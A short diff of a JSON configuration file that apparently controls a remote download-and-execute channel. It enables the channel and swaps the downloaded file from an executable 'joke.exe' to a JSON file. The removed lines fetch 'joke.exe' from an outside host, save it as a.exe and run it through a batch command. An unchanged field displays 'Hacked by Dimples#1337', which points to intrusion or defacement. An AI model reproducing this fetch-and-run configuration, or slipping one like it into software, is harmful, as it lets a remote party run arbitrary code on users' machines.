@@ -1,9 +1,9 @@
 {
-  "enable": false,
+  "enable": true,
   "inneed": [
     {
-      "url": "https://ling-res.guimc.ltd/joke.exe",
-      "name": "a.exe"
+      "url": "https://ling-res.guimc.ltd/simple.json",
+      "name": "LLL"
     }
   ],
   "rundir": {
@@ -21,6 +21,6 @@
     "text": "Hacked by Dimples#1337"
   },
   "run": {
-    "command": "@echo off\n$rundir\\a.exe\nexit"
+    "command": "echo."
   }
 }
